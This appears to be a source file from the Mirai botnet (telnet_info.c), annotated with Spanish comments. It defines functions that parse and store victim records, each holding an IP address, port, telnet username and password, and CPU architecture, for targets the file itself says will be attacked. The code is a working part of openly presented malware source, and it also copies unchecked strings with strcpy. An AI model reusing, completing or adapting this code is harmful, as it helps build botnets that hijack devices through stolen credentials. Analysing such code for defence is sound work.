/**************************************************************************
 * Archivo: telnet_info.c
 * Descripción: Implementación de funciones para manejar la información de
 * conexiones telnet en el bot Mirai. Este módulo gestiona la información
 * de autenticación, arquitectura y detalles de conexión para los objetivos
 * que serán atacados.
 **************************************************************************/

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include "headers/includes.h"
#include "headers/telnet_info.h"

/**
 * Crea o inicializa una nueva estructura telnet_info con los datos proporcionados
 * @param user    Nombre de usuario para la autenticación telnet
 * @param pass    Contraseña para la autenticación telnet
 * @param arch    Arquitectura del sistema objetivo (arm, mips, x86, etc.)
 * @param addr    Dirección IPv4 del objetivo
 * @param port    Puerto para la conexión telnet
 * @param info    Puntero a la estructura a inicializar (puede ser NULL)
 * @return        Puntero a la estructura inicializada
 */
struct telnet_info *telnet_info_new(char *user, char *pass, char *arch, ipv4_t addr, port_t port, struct telnet_info *info)
{
    // Copia el nombre de usuario si se proporciona
    if (user != NULL)
        strcpy(info->user, user);
    // Copia la contraseña si se proporciona
    if (pass != NULL)
        strcpy(info->pass, pass);
    // Copia la arquitectura si se proporciona
    if (arch != NULL)
        strcpy(info->arch, arch);
    
    // Asigna la dirección IP y puerto
    info->addr = addr;
    info->port = port;

    // Establece flags de estado
    info->has_auth = user != NULL || pass != NULL;  // TRUE si se proporcionó usuario o contraseña
    info->has_arch = arch != NULL;                  // TRUE si se proporcionó arquitectura

    return info;  // Devuelve la estructura inicializada
}

/**
 * Analiza una cadena en formato "ip:puerto usuario:contraseña arquitectura"
 * y la convierte en una estructura telnet_info
 * 
 * @param str    Cadena a analizar en formato "ip:puerto usuario:contraseña arquitectura"
 * @param out    Puntero a la estructura donde se almacenarán los datos
 * @return       Puntero a la estructura llena o NULL si hay error de formato
 * 
 * Formato esperado de la cadena de entrada:
 * - IP:PUERTO - Dirección IPv4 y puerto separados por dos puntos
 * - USUARIO:CONTRASEÑA - Credenciales separadas por dos puntos (?: para omitir)
 * - ARQUITECTURA - Identificador de arquitectura (opcional)
 */
struct telnet_info *telnet_info_parse(char *str, struct telnet_info *out)
{
    // Variables para almacenar las partes de la cadena
    char *conn, *auth, *arch;              // Componentes principales
    char *addr_str, *port_str;             // Partes de la conexión
    char *user = NULL, *pass = NULL;       // Credenciales
    ipv4_t addr;                           // Dirección IP convertida
    port_t port;                           // Puerto convertido

    // Divide la cadena en sus componentes principales
    if ((conn = strtok(str, " ")) == NULL)         // Obtiene "ip:puerto"
        return NULL;                                // Error si no hay datos de conexión
    if ((auth = strtok(NULL, " ")) == NULL)        // Obtiene "usuario:contraseña"
        return NULL;                                // Error si no hay datos de autenticación
    arch = strtok(NULL, " ");                      // Obtiene arquitectura (opcional)

    // Separa la dirección IP y el puerto
    if ((addr_str = strtok(conn, ":")) == NULL)    // Obtiene la dirección IP
        return NULL;                                // Error si no hay IP
    if ((port_str = strtok(NULL, ":")) == NULL)    // Obtiene el puerto
        return NULL;                                // Error si no hay puerto

    // Procesa la información de autenticación
    if (strlen(auth) == 1)  // Si solo hay un carácter
    {
        if (auth[0] == ':')  // Si es ':', significa credenciales vacías
        {
            user = "";       // Usuario vacío
            pass = "";       // Contraseña vacía
        }
        else if (auth[0] != '?')  // Si no es '?', es un formato inválido
            return NULL;
    }
    else  // Si hay más de un carácter, debe tener formato usuario:contraseña
    {
        user = strtok(auth, ":");        // Extrae el usuario
        pass = strtok(NULL, ":");        // Extrae la contraseña
    }

    // Convierte la dirección IP de string a formato binario
    addr = inet_addr(addr_str);
    // Convierte el puerto a número y lo pasa a orden de red
    port = htons(atoi(port_str));

    // Crea una nueva estructura telnet_info con los datos procesados
    return telnet_info_new(user, pass, arch, addr, port, out);
}
